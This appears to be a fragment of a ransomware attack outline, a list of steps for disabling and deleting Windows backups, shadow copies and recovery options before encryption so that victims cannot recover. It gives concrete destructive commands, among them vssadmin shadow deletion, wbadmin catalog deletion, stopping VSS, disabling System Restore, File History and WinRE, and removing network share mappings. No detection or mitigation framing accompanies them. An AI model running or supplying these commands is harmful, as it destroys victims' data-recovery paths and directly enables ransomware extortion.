      Disable or corrupt system backups and shadow copies before encryption to prevent recovery
        Delete Volume Shadow Copies using vssadmin.exe: "vssadmin delete shadows /all /quiet"
        Disable Volume Shadow Service (VSS) using net.exe: "net stop vss"
        Modify Windows Backup Service: "sc config SDRSVC start=disabled"
        Clear Windows backup history using wbadmin.exe: "wbadmin delete catalog -quiet"
        Delete backup files in Windows Backup locations: "%UserProfile%\AppData\Local\Microsoft\Windows\WindowsBackup"
        Disable System Restore using PowerShell: "Disable-ComputerRestore -Drive 'C:\'"
        Remove System Restore Points: "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB"
        Terminate backup software processes using taskkill commands
        Modify registry keys to disable automatic backup features: "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsBackup"
        Delete specific backup application data directories and configuration files
        Modify Group Policy backup settings: "gpupdate /force" after editing backup-related policies
        Disable Windows File History: "powershell -command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\FileHistory' -Name 'Disabled' -Value 1""
        Remove network backup share mappings: "net use * /delete /y"
        Clear Windows Recovery Environment (WinRE): "reagentc /disable"
        Delete backup configuration files in ProgramData directory
